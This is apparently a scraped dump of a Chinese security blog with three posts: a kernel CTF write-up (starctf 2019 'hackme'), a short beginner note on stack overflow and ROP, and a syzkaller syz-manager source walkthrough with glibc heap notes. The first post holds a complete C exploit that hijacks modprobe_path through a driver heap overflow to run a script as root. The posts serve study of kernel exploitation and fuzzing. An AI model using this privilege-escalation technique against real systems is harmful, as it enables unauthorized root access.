wait);&#125;\n\n利用思路所以我们的思路就是覆盖掉modprobe_path值为我们期望的值即可。\n那么首先还是需要泄露地址，这里泄露堆地址就不再提了，存在向上任意溢出所以随便怎么泄露都可。\n内核基址的读取需要一点猜测的成分在，可知0号内存0xffff88800017a500之前是已经在用的系统块，那么一定存在一些内核的指针。\n\n\n可以看到这上面确实存在一个固定函数地址，所以可以跟他计算出基地值。\n虽然我们可以直接泄露出来modprobe_path的地址，并且实现任意分配堆地址分配到指定位置，但是这样会破坏很多周围的数据，我们的想法肯定是值修改modprobe_path的值，所以我们还需要进一步利用。接下来的思路就是将堆块分配到pool上，那么我们就可以篡改pool上的堆指针为modprobe_path的地址，那我们就可以只修改他的值了，那么现在的问题是怎么获取到pool的值呢？\n\n在mod_tree内存的附近处会存留驱动的地址\n\n所以我们可以任意堆分配到这里然后泄露出驱动地址，紧接着任意堆分配到pool最后修改pool中的指针为modprobe_path地址，最后修改modprobe_path的值即可\n综上，exp#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;struct Arg&#123;    long int idx;    char *content;    long int size;    long int offset;&#125;;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;int main()&#123;    struct Arg arg;    int fp = open(&quot;/dev/hackme&quot;, 0);    if (fp &lt; 0)    &#123;        printf(&quot;[-] open /dev/hackme failed\\n&quot;);        exit(-1);    &#125;    char *buf;    long int heap_addr;    long int kernel_addr;    long int mod_tree_addr;    long int mode_addr;    long int pool_addr;    long int modprobe_path_addr;    buf = malloc(0x1000);    memset(buf, 0, 0x1000);    memset(buf, &#x27;a&#x27;, 0x100);    arg.idx = 0;    arg.content = buf;    arg.size = 0x100;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 1;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 2;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 3;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 4;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 1;    ioctl(fp, 0x30001, &amp;arg);    arg.idx = 3;    ioctl(fp, 0x30001, &amp;arg);    memset(buf, 0, 0x1000);    arg.idx = 4;    arg.content = buf;    arg.offset = -0x100;    arg.size = 0x100;    ioctl(fp, 0x30003, &amp;arg);    print_hex(buf, sizeof(buf));    heap_addr = *((unsigned long int *)buf);    memset(buf, 0, 0x1000);    arg.idx = 0;    arg.content = buf;    arg.offset = -0x200 + 0x28;    arg.size = 0x200 - 0x28;    ioctl(fp, 0x30003, &amp;arg);    print_hex(buf, sizeof(buf));    kernel_addr = *((unsigned long int *)buf);    mod_tree_addr = kernel_addr - 0x38ae0;    memset(buf, 0, 0x1000);    *((unsigned long int *)buf) = mod_tree_addr + 0x20;    arg.idx = 4;    arg.content = buf;    arg.offset = -0x100;    arg.size = 0x100;    ioctl(fp, 0x30002, &amp;arg);    memset(buf, &#x27;a&#x27;, 0x100);    arg.idx = 5;    arg.content = buf;    arg.size = 0x100;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 6;    ioctl(fp, 0x30000, &amp;arg);    memset(buf, 0, 0x1000);    arg.idx = 6;    arg.content = buf;    arg.size = 0x8;    arg.offset = -0x8;    ioctl(fp, 0x30003, &amp;arg);    print_hex(buf, sizeof(buf));    mode_addr = *((unsigned long int *)buf);    pool_addr = mode_addr + 0x2400;    arg.idx = 5;    ioctl(fp, 0x30001, &amp;arg);    *((unsigned long int *)buf) = pool_addr + 0x90;    arg.idx = 4;    arg.content = buf;    arg.offset = -0x100;    arg.size = 0x100;    ioctl(fp, 0x30002, &amp;arg);    modprobe_path_addr = mod_tree_addr + 0x2e960;    memset(buf, &#x27;a&#x27;, 0x100);    arg.idx = 7;    arg.content = buf;    arg.size = 0x100;    ioctl(fp, 0x30000, &amp;arg);    arg.idx = 8;    memset(buf, 0, 0x1000);    *((unsigned long int *)buf) = modprobe_path_addr;    *((unsigned long int *)buf + 1) = 0x100;    ioctl(fp, 0x30000, &amp;arg);    strncpy(buf, &quot;/home/pwn/copy.sh\\x00&quot;, 18);    arg.idx = 9;    arg.content = buf;    arg.size = 0x18;    arg.offset = 0;    ioctl(fp, 0x30002, &amp;arg);    system(&quot;echo -ne &#x27;#!/bin/sh\\n/bin/cp /flag /home/pwn/flag\\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;);    system(&quot;chmod +x /home/pwn/copy.sh&quot;);    system(&quot;echo -ne &#x27;\\\\xff\\\\xff\\\\xff\\\\xff&#x27; &gt; /home/pwn/dummy&quot;);    system(&quot;chmod +x /home/pwn/dummy&quot;);    system(&quot;/home/pwn/dummy&quot;);    return 0;&#125;\n\n\n当然其实在劫持到pool这一步也是可以直接使用 WCTF 2018 klist 这道题的利用方式，利用堆溢出泄漏出cred然后修改cred结构体即可，因为这道题目的漏洞相对来说比较严重，所以ptmx劫持栈什么的都是可以的。这篇文章主要是记录没有遇到过的利用方法。\n\n参考链接：http://p4nda.top/2019/05/01/starctf-2019-hackme/#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87\n","categories":["Linux Kernel"],"tags":["modprobe_path"]},{"title":"在刚开始学习pwn的小问题","url":"/2021/09/17/study-pwn1/","content":"\n关于stack overflow的学习\n一般来说会出现get函数，这个函数不受保护可以无限写入，导致可以修改栈内部的内容，填充垃圾数据然后在需要的地方修改到我们需要的地址达到返回shell的效果。\n还可能会出现scanf函数并且函数后面的限制长度会比较长可以实现栈溢出的效果。\n\nROP\n\n\n上图就是执行system的流程，但是我们需要获得反弹shell的话就必须执行system(‘/bin/sh’)需要参数，所以我们需要给system参数。\n当我们跳转到函数地址的时候为了保存数据，会对栈进行操作，x86程序的操作的流程是:\n\n所以可以把system的参数放到栈里面，这样的话就可以填充一个位置的垃圾数据，然后紧跟着往栈里面放需要的参数也就是’/bin/sh’的地址。\n在ubuntu18以上，通过栈溢出ret到system需要注意栈平衡\n","categories":["pwn"],"tags":["rop stack overflow"]},{"title":"syzkaller: syz-manager源码分析","url":"/2023/11/17/syzkaller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/","content":"前言这篇文章的前言主要提一下前段时间在强网拟态中的pwn，首先是内核pwn。\n其实很简单就是一个简单版的off by null。但是我犯蠢了，在堆喷pipe_buffer时计算错误导致堆喷失败以至于在开始放弃了使用此方法，转而使用msg_msg形成双向链表造成UAF，可惜的是此方法因为off by null的限制使得其申请的堆块应该是从kmalloc-192或以下申请，所以很多可以堆喷来写入的结构体无法使用，如果继续使用msg_msgseg结构体来实现任意写也会因为其存在一个next指针导致无法free。最后这道题依旧是通过构造多级管道解出。\n这里重点提一下那一道堆题（做完内核凌晨四点了，这道题没做）。简单描述一下漏洞，首先其edit函数中存在off by null，然后还可以在create函数中一直申请堆块，不过这里限制大小为 0~0x78 ，所有的堆块范围都在fastbin内。然后估摸着这题的利用方法应该和top chunk有关，但是仔细看了一下house of force发现条件并不满足，在比赛快结束时看了一下源码发现了以往不知道的机制。\nuse_top:victim = av-&gt;top;size = chunksize (victim);if (__glibc_unlikely (size &gt; av-&gt;system_mem))  malloc_printerr (&quot;malloc(): corrupted top size&quot;);if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))&#123;  remainder_size = size - nb;  remainder = chunk_at_offset (victim, nb);  av-&gt;top = remainder;  set_head (victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));  set_head (remainder, remainder_size | PREV_INUSE);  check_malloced_chunk (av, victim, nb);  void *p = chunk2mem (victim);  alloc_perturb (p, bytes);  return p;&#125;/* When we are using atomic ops to free fast chunks we can get         here for all block sizes.  */else if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))&#123;  malloc_consolidate (av);  /* restore original bin index */  if (in_smallbin_range (nb))    idx = smallbin_index (nb);  else    idx = largebin_index (nb);&#125;/*         Otherwise, relay to handle system-dependent cases       */else&#123;  void *p = sysmalloc (nb, av);  if (p != NULL)    alloc_perturb (p, bytes);  return p;&#125;&#125;\n\n上述代码是_int_malloc函数中的片段，这个片段是使用top chunk进行分配时的片段，首先是申请的大小加上16要小于top chunk的大小时进入到第一个分支中，这个分支所做的事情的对top chunk进行切割。\n然后直接看最末的这一个分支，这个分支是前两个都不满足时会进入也就是无法从现有的av中得到空间了便开始使用sysmalloc进行分配。\n中间的分支首先会检查fastbin中是否存在堆块随后进入到malloc_consolidate函数中\nstatic void malloc_consolidate(mstate av)&#123;  mfastbinptr*    fb;                 /* current fastbin being consolidated */  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */  mchunkptr       p;                  /* current chunk being consolidated */  mchunkptr       nextp;              /* next chunk to consolidate */  mchunkptr       unsorted_bin;       /* bin header */  mchunkptr       first_unsorted;     /* chunk to link to */  /* These have same use as in free() */  mchunkptr       nextchunk;  INTERNAL_SIZE_T size;  INTERNAL_SIZE_T nextsize;  INTERNAL_SIZE_T prevsize;  int             nextinuse;  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, false);  unsorted_bin = unsorted_chunks(av);  /*    Remove each chunk from fast bin and consolidate it, placing it    then in unsorted bin. Among other reasons for doing this,    placing in unsorted bin avoids needing to calculate actual bins    until malloc is sure that chunks aren&#x27;t immediately going to be    reused anyway.  */  maxfb = &amp;fastbin (av, NFASTBINS - 1);  fb = &amp;fastbin (av, 0);  do &#123;    p = atomic_exchange_acq (fb, NULL);    if (p != 0) &#123;      do &#123;\t&#123;\t  if (__glibc_unlikely (misaligned_chunk (p)))\t    malloc_printerr (&quot;malloc_consolidate(): &quot;\t\t\t     &quot;unaligned fastbin chunk detected&quot;);\t  unsigned int idx = fastbin_index (chunksize (p));\t  if ((&amp;fastbin (av, idx)) != fb)\t    malloc_printerr (&quot;malloc_consolidate(): invalid chunk size&quot;);\t&#125;\tcheck_inuse_chunk(av, p);\tnextp = REVEAL_PTR (p-&gt;fd);\t/* Slightly streamlined version of consolidation code in free() */\tsize = chunksize (p);\tnextchunk = chunk_at_offset(p, size);\tnextsize = chunksize(nextchunk);\tif (!prev_inuse(p)) &#123;\t  prevsize = prev_size (p);\t  size += prevsize;\t  p = chunk_at_offset(p, -((long) prevsize));\t  if (__glibc_unlikely (chunksize(p) != prevsize))\t    malloc_printerr (&quot;corrupted size vs. prev_size in fastbins&quot;);\t  unlink_chunk (av, p);\t&#125;\tif (nextchunk != av-&gt;top) &#123;\t  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\t  if (!nextinuse) &#123;\t    size += nextsize;\t    unlink_chunk (av, nextchunk);\t  &#125; else\t    clear_inuse_bit_at_offset(nextchunk, 0);\t  first_unsorted = unsorted_bin-&gt;fd;\t  unsorted_bin-&gt;fd = p;\t  first_unsorted-&gt;bk = p;\t  if (!in_smallbin_range (size)) &#123;\t    p-&gt;fd_nextsize = NULL;\t    p-&gt;bk_nextsize = NULL;\t  &#125;\t  set_head(p, size | PREV_INUSE);\t  p-&gt;bk = unsorted_bin;\t  p-&gt;fd = first_unsorted;\t  set_foot(p, size);\t&#125;\telse &#123;\t  size += nextsize;\t  set_head(p, size | PREV_INUSE);\t  av-&gt;top = p;\t&#125;      &#125; while ( (p = nextp) != 0);    &#125;  &#125; while (fb++ != maxfb);&#125;\n\n这个函数的所做的事情就显而易见了，就是从fastbin中取出堆块进行合并放入到unsorted bin中。后续利用就不详细提了（因为我也没看了）但是估计就是通过off by null打unlink实现任意地址写。\n下面回归正题开始syzkaller的分析，首先其工作原理在前一篇文章中提过，这里就不再重提了。前一篇文章提到syzkaller分为了三大组件，其实通过图就能看出来syz-fuzzer和syz-executor都是位于虚拟机中的，而syz-manager位于Host主机中。\n这里直接分析函数，在分析函数的过程中将有用的结构体再进一步分析。\nRunManager函数func main() &#123;\tif prog.GitRevision == &quot;&quot; &#123;\t\tlog.Fatalf(&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;)\t&#125;\tflag.Parse()\tlog.EnableLogCaching(1000, 1&lt;&lt;20)\tcfg, err := mgrconfig.LoadFile(*flagConfig)\tif err != nil &#123;\t\tlog.Fatalf(&quot;%v&quot;, err)\t&#125;\tRunManager(cfg)&#125;\n\n首先看syz-manager的main函数，其会读取传入的配置文件然后直接调用RunManager函数。\nfunc RunManager(cfg *mgrconfig.Config) &#123;\tvar vmPool *vm.Pool\tif cfg.Type != &quot;none&quot; &#123;\t\tvar err error\t\tvmPool, err = vm.Create(cfg, *flagDebug)\t\tif err != nil &#123;\t\t\tlog.Fatalf(&quot;%v&quot;, err)\t\t&#125;\t&#125;\t// ... ...&#125;\n\n这里首先是初始化VM pool使用vm.Create函数进行创建。\nfunc Create(cfg *mgrconfig.Config, debug bool) (*Pool, error) &#123;\ttyp, ok := vmimpl.Types[vmType(cfg.Type)]\tif !ok &#123;\t\treturn nil, fmt.Errorf(&quot;unknown instance type &#x27;%v&#x27;&quot;, cfg.Type)\t&#125;\tenv := &amp;vmimpl.Env&#123;\t\tName:      cfg.Name,\t\tOS:        cfg.TargetOS,\t\tArch:      cfg.TargetVMArch,\t\tWorkdir:   cfg.Workdir,\t\tImage:     cfg.Image,\t\tSSHKey:    cfg.SSHKey,\t\tSSHUser:   cfg.SSHUser,\t\tTimeouts:  cfg.Timeouts,\t\tDebug:     debug,\t\tConfig:    cfg.VM,\t\tKernelSrc: cfg.KernelSrc,\t&#125;\timpl, err := typ.Ctor(env)\tif err != nil &#123;\t\treturn nil, err\t&#125;\treturn &amp;Pool&#123;\t\timpl:     impl,\t\tworkdir:  env.Workdir,\t\ttemplate: cfg.WorkdirTemplate,\t\ttimeouts: cfg.Timeouts,\t&#125;, nil&#125;\n\n这里主要做的事情是，首先获取VM类型，随后封装env结构体，最后调用VM Pool构造函数并返回。\ntype Pool struct &#123;\timpl        vmimpl.Pool\tworkdir     string\ttemplate    string\ttimeouts    targets.Timeouts\tactiveCount int32&#125;\n\n这里简单提一下Pool结构体，类似于线程池的概念，在syz-manager使用一个VM池也就是Pool结构体来管理Guest VM。\n// Pool represents a set of test machines (VMs, physical devices, etc) of particular type.type Pool interface &#123;\t// Count returns total number of VMs in the pool.\tCount() int\t// Create creates and boots a new VM instance.\tCreate(workdir string, index int) (Instance, error)&#125;\n\n其接口实现又两个函数，第一个是返回当前池子里所有的VM数量，第二个是创建并启动一个新的实例，并且返回这个实例。\ncrashdir := filepath.Join(cfg.Workdir, &quot;crashes&quot;)osutil.MkdirAll(crashdir)reporter, err := report.NewReporter(cfg)if err != nil &#123;  log.Fatalf(&quot;%v&quot;, err)&#125;\n\n回到RunManager函数中，这里主要做的事情是创建一个crashes目录，然后生成一个reporter实例。\ntype Report struct &#123;\t// Title contains a representative description of the first oops.\tTitle string\t// Alternative titles, used for better deduplication.\t// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.\tAltTitles []string\t// Bug type (e.g. hang, memory leak, etc).\tType Type\t// The indicative function name.\tFrame string\t// Report contains whole oops text.\tReport []byte\t// Output contains whole raw console output as passed to Reporter.Parse.\tOutput []byte\t// StartPos/EndPos denote region of output with oops message(s).\tStartPos int\tEndPos   int\t// SkipPos is position in output where parsing for the next report should start.\tSkipPos int\t// Suppressed indicates whether the report should not be reported to user.\tSuppressed bool\t// Corrupted indicates whether the report is truncated of corrupted in some other way.\tCorrupted bool\t// CorruptedReason contains reason why the report is marked as corrupted.\tCorruptedReason string\t// Recipients is a list of RecipientInfo with Email, Display Name, and type.\tRecipients vcs.Recipients\t// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).\tGuiltyFile string\t// reportPrefixLen is length of additional prefix lines that we added before actual crash report.\treportPrefixLen int\t// symbolized is set if the report is symbolized.\tsymbolized bool&#125;\n\nReport结构体用来表示单次执行的结果，包括是否产生了crash、Oops的信息等等。\nmgr := &amp;Manager&#123;  cfg:              cfg,  vmPool:           vmPool,  target:           cfg.Target,  sysTarget:        cfg.SysTarget,  reporter:         reporter,  crashdir:         crashdir,  startTime:        time.Now(),  stats:            &amp;Stats&#123;haveHub: cfg.HubClient != &quot;&quot;&#125;,  crashTypes:       make(map[string]bool),  corpus:           make(map[string]CorpusItem),  disabledHashes:   make(map[string]struct&#123;&#125;),  memoryLeakFrames: make(map[string]bool),  dataRaceFrames:   make(map[string]bool),  fresh:            true,  vmStop:           make(chan bool),  hubReproQueue:    make(chan *Crash, 10),  needMoreRepros:   make(chan chan bool),  reproRequest:     make(chan chan map[string]bool),  usedFiles:        make(map[string]time.Time),  saturatedCalls:   make(map[string]bool),&#125;mgr.preloadCorpus()mgr.initStats() // Initializes prometheus variables.mgr.initHTTP()  // Creates HTTP server.mgr.collectUsedFiles()// Create RPC server for fuzzers.mgr.serv, err = startRPCServer(mgr)if err != nil &#123;  log.Fatalf(&quot;failed to create rpc server: %v&quot;, err)&#125;if cfg.DashboardAddr != &quot;&quot; &#123;  mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)  if err != nil &#123;    log.Fatalf(&quot;failed to create dashapi connection: %v&quot;, err)  &#125;&#125;if !cfg.AssetStorage.IsEmpty() &#123;  mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)  if err != nil &#123;    log.Fatalf(&quot;failed to init asset storage: %v&quot;, err)  &#125;&#125;\n\n跟着函数流程往下走，首先这里会创建一个Manager实例，然后下面四个函数的作用分别是:\nmgr.preloadCorpus(): 检查 corpus.db 文件是否存在（若不存在则创建）并载入 sys/linux/test 目录下的测试用模板\n# Create an io_uring instancer0 = syz_io_uring_setup(0xF00, &amp;AUTO=&#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, &quot;000000000000000000000000&quot;, [0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0], [0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]&#125;, &amp;AUTO=&lt;r1=&gt;0x0, &amp;AUTO=&lt;r2=&gt;0x0)# Set IORING_CQ_EVENTFD_DISABLED. Has no side-effect for the test,# only tests syz_memcpy_off().syz_memcpy_off$IO_URING_METADATA_FLAGS(r1, 0x114, &amp;AUTO=0x1, 0x0, AUTO)# Write an openat2 operation to the submission queuesyz_io_uring_submit(r1, r2, &amp;AUTO=@IORING_OP_OPENAT2=&#123;AUTO, 0x0, AUTO, 0xffffffffffffff9c, &amp;AUTO=&#123;0x42, 0x0, 0x0&#125;, &amp;AUTO=&#x27;./file1\\x00&#x27;, AUTO, AUTO, 0x12345, &#123;AUTO, 0x0, &quot;0000000000000000000000000000000000000000&quot;&#125;&#125;)# Notify the kernel about the submission and wait until completionio_uring_enter(r0, 0x1, 0x1, 0x1, 0x0, 0x0)# Get the resulting fd from the completion queuer3 = syz_io_uring_complete(r1)# Close the fileclose(r3)\n\n如上是sys/linux/test/io_uring模板\nmgr.initStates(): 注册一个 prometheus 监视器（一个开源的监视&amp;预警工具包）\n mgr.initHTTP(): 创建一个 HTTP 服务器并注册一系列的目录\nmgr.collectUsedFiles(): 检查所需文件是否存在\n随后通过startRPCServer函数创建一个RPC服务器，该服务器用于Host与Guest VMs进行通信。最后初始化dashboard相关内容。\ntype Manager struct &#123;\tcfg            *mgrconfig.Config\tvmPool         *vm.Pool\ttarget         *prog.Target\tsysTarget      *targets.Target\treporter       *report.Reporter\tcrashdir       string\tserv           *RPCServer\tcorpusDB       *db.DB\tstartTime      time.Time\tfirstConnect   time.Time\tfuzzingTime    time.Duration\tstats          *Stats\tcrashTypes     map[string]bool\tvmStop         chan bool\tcheckResult    *rpctype.CheckArgs\tfresh          bool\tnumFuzzing     uint32\tnumReproducing uint32\tdash *dashapi.Dashboard\tmu                    sync.Mutex\tphase                 int\ttargetEnabledSyscalls map[*prog.Syscall]bool\tcandidates       []rpctype.Candidate // untriaged inputs from corpus and hub\tdisabledHashes   map[string]struct&#123;&#125;\tcorpus           map[string]CorpusItem\tseeds            [][]byte\tnewRepros        [][]byte\tlastMinCorpus    int\tmemoryLeakFrames map[string]bool\tdataRaceFrames   map[string]bool\tsaturatedCalls   map[string]bool\tneedMoreRepros chan chan bool\thubReproQueue  chan *Crash\treproRequest   chan chan map[string]bool\t// For checking that files that we are using are not changing under us.\t// Maps file name to modification time.\tusedFiles map[string]time.Time\tmodules            []host.KernelModule\tcoverFilter        map[uint32]uint32\tcoverFilterBitmap  []byte\tmodulesInitialized bool\tassetStorage *asset.Storage&#125;\n\n上述就是Manager结构体，这里只说几个重要的成员：\n\n  cfg: 基本设置信息，存放在一个json文件中\n  vmPool: 所用的vm Pool\n  reporter: 用以报告crash\n  serv: RPC server用于与Guest VM通信\n  corpusDB: 用于存放语料的数据库\n  targetEnabledSyscalls: 测试用例所允许使用的系统调用\n  candidates: 待执行测试用例\n  corpus: 语料库\n  seeds: 用来对语料库变异的种子\n\ngo func() &#123;  for lastTime := time.Now(); ; &#123;    time.Sleep(10 * time.Second)    now := time.Now()    diff := now.Sub(lastTime)    lastTime = now    mgr.mu.Lock()    if mgr.firstConnect.IsZero() &#123;      mgr.mu.Unlock()      continue    &#125;    mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))    executed := mgr.stats.execTotal.get()    crashes := mgr.stats.crashes.get()    corpusCover := mgr.stats.corpusCover.get()    corpusSignal := mgr.stats.corpusSignal.get()    maxSignal := mgr.stats.maxSignal.get()    triageQLen := len(mgr.candidates)    mgr.mu.Unlock()    numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)    numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)    log.Logf(0, &quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v, triageQLen %v&quot;,             numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing, triageQLen)  &#125;&#125;()\n\n这里会新起一个写成进行数据记录的工作，函数内部就是一个for循环并且没有停止的，其作用就是每隔十秒进行一次进度采集并输出日志，主要是采集执行信息、语料覆盖率、crashes 信息等。\nif *flagBench != &quot;&quot; &#123;  mgr.initBench()&#125;if mgr.dash != nil &#123;  go mgr.dashboardReporter()&#125;osutil.HandleInterrupts(vm.Shutdown)if mgr.vmPool == nil &#123;  log.Logf(0, &quot;no VMs started (type=none)&quot;)  log.Logf(0, &quot;you are supposed to start syz-fuzzer manually as:&quot;)  log.Logf(0, &quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;, mgr.serv.port)  &lt;-vm.Shutdown  return&#125;mgr.vmLoop()\n\n首先，这里会先判断flagBench是否不为空字符串，如果不为空字符串则调用initBench函数。\nvar (\tflagConfig = flag.String(&quot;config&quot;, &quot;&quot;, &quot;configuration file&quot;)\tflagDebug  = flag.Bool(&quot;debug&quot;, false, &quot;dump all VM output to console&quot;)\tflagBench  = flag.String(&quot;bench&quot;, &quot;&quot;, &quot;write execution statistics into this file periodically&quot;))\n\n这里的flagBench是一个全局变量，使用的是golang的flag包解析命令行。\nfunc (mgr *Manager) initBench() &#123;\tf, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)\tif err != nil &#123;\t\tlog.Fatalf(&quot;failed to open bench file: %v&quot;, err)\t&#125;\tgo func() &#123;\t\tfor &#123;\t\t\ttime.Sleep(time.Minute)\t\t\tvals := mgr.stats.all()\t\t\tmgr.mu.Lock()\t\t\tif mgr.firstConnect.IsZero() &#123;\t\t\t\tmgr.mu.Unlock()\t\t\t\tcontinue\t\t\t&#125;\t\t\tmgr.minimizeCorpus()\t\t\tvals[&quot;corpus&quot;] = uint64(len(mgr.corpus))\t\t\tvals[&quot;uptime&quot;] = uint64(time.Since(mgr.firstConnect)) / 1e9\t\t\tvals[&quot;fuzzing&quot;] = uint64(mgr.fuzzingTime) / 1e9\t\t\tvals[&quot;candidates&quot;] = uint64(len(mgr.candidates))\t\t\tmgr.mu.Unlock()\t\t\tdata, err := json.MarshalIndent(vals, &quot;&quot;, &quot;  &quot;)\t\t\tif err != nil &#123;\t\t\t\tlog.Fatalf(&quot;failed to serialize bench data&quot;)\t\t\t&#125;\t\t\tif _, err := f.Write(append(data, &#x27;\\n&#x27;)); err != nil &#123;\t\t\t\tlog.Fatalf(&quot;failed to write bench data&quot;)\t\t\t&#125;\t\t&#125;\t&#125;()&#125;\n\ninitBench会启动一个协程，这个协程会每隔一分钟循环一次，其主要功能是调用minimizeCorpus将语料库进行最小化，想bench参数指定的文件写入语料库长度、启动时间、fuzzing 时间。\n回到RunManager函数中，接下来又会调用dashboardReporter启动一个新的协程，这里的作用就是每隔一分钟上报一次syz-manager的状态。\n最后检查一下VM Pool并调用vmloop函数。\nvmloop函数// Manager needs to be refactored (#605).// nolint: gocyclo, gocognit, funlenfunc (mgr *Manager) vmLoop() &#123;\tlog.Logf(0, &quot;booting test machines...&quot;)\tlog.Logf(0, &quot;wait for the connection from test machine...&quot;)\tinstancesPerRepro := 3\tvmCount := mgr.vmPool.Count()\tmaxReproVMs := vmCount - mgr.cfg.FuzzingVMs\tif instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; 0 &#123;\t\tinstancesPerRepro = maxReproVMs\t&#125;  // ... ...&#125;\n\n函数首先对VM进行分组，一共分为两组，一组负责fuzzing，一组负责复现crash( maxReproVMs )。\ninstances := SequentialResourcePool(vmCount, 10*time.Second*mgr.cfg.Timeouts.Scale)runDone := make(chan *RunResult, 1)pendingRepro := make(map[*Crash]bool)reproducing := make(map[string]bool)var reproQueue []*CrashreproDone := make(chan *ReproResult, 1)stopPending := falseshutdown := vm.Shutdown\n\n接着会调用SequentialResourcePool函数新建一个ResourcePool队列，主要负责对空闲的VM的使用顺序进行调控。\n随后会初始化一系列的变量：\n\n  runDone：保存 fuzzing 结果为 crash 的 Crash 队列\n  pendingRepro：标识待复现的 Crash\n  reproducing：标识某个类型 Crash 是否准备被复现\n  reproQueue：Crash 的复现队列\n  reproDone：Crash 的复现结果\n  stopPending：等待停止标志位\n  shutdown：工作终止标志位\n\n最后进入到一个大循环中，而这个大循环才是真正意义上的fuzzing调控流程。\nfor shutdown != nil || instances.Len() != vmCount &#123;\t\tmgr.mu.Lock()\t\tphase := mgr.phase\t\tmgr.mu.Unlock()    \t// ... ...&#125;\n\n大循环终止循环的条件是shutdown != nil或者ResourcePool中的VM数量与总数量不相等，进入循环后首先做的事就是获取当前所进行的阶段。\nfor crash := range pendingRepro &#123;  if reproducing[crash.Title] &#123;    continue  &#125;  delete(pendingRepro, crash)  if !mgr.needRepro(crash) &#123;    continue  &#125;  log.Logf(1, &quot;loop: add to repro queue &#x27;%v&#x27;&quot;, crash.Title)  reproducing[crash.Title] = true  reproQueue = append(reproQueue, crash)&#125;\n\n紧接着进入到内层小循环，这里会遍历reproducing中的crash，如果没有被复现过则从pendingRepro中删除，随后调用mgr.needRepro来看crash是否需要被复现，后面标记该标题的crash为已复现，最后加入到复现的队列中。\n这里的crash.Title为Oops的第一行文本，从上面的逻辑可以看出来，一次只能复现同类crash中的一个。\nlog.Logf(1, &quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;,         phase, shutdown == nil, instances.Len(), vmCount, instances.Snapshot(),         len(pendingRepro), len(reproducing), len(reproQueue))canRepro := func() bool &#123;  return phase &gt;= phaseTriagedHub &amp;&amp; len(reproQueue) != 0 &amp;&amp;  (int(atomic.LoadUint32(&amp;mgr.numReproducing))+1)*instancesPerRepro &lt;= maxReproVMs&#125;\n\n接下来先输出一段日志，随后定义了一个闭包函数canRepro，该函数的功能就是判断是否能够进行crash复现返回的是bool类型。\n首先会判断当前阶段是否已经超过了phaseTriagedHub阶段，随后判断reproQueue也就是复现队列是否为空，最后判断加上该crash后用于复现的VM是否小于等于maxReproVMs。\nif shutdown != nil &#123;  for canRepro() &#123;    vmIndexes := instances.Take(instancesPerRepro)    if vmIndexes == nil &#123;      break    &#125;    last := len(reproQueue) - 1    crash := reproQueue[last]    reproQueue[last] = nil    reproQueue = reproQueue[:last]    atomic.AddUint32(&amp;mgr.numReproducing, 1)    log.Logf(0, &quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;, crash.Title, vmIndexes)    go func() &#123;      reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)    &#125;()  &#125;  for !canRepro() &#123;    idx := instances.TakeOne()    if idx == nil &#123;      break    &#125;    log.Logf(1, &quot;loop: starting instance %v&quot;, *idx)    go func() &#123;      crash, err := mgr.runInstance(*idx)      runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;    &#125;()  &#125;&#125;\n\n这里首先会判断shutdown，然后进入道两个小循环中。首先看第一个小循环，洗衣歌循环的进入条件就是能够进行crash复现。\n这里首先从资源池中取出一个vmIndexes，如果返回的是nil则直接退出循环。随后从reproQueue中取出一个crash，随后更新mgr.numReproducing计数。随后新开启一个写成调用mgr.runRepro对crash进行复现，并将返回值输入到reproDone队列中。\nfunc (mgr *Manager) runRepro(crash *Crash, vmIndexes []int, putInstances func(...int)) *ReproResult &#123;\tfeatures := mgr.checkResult.Features\tres, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)\tret := 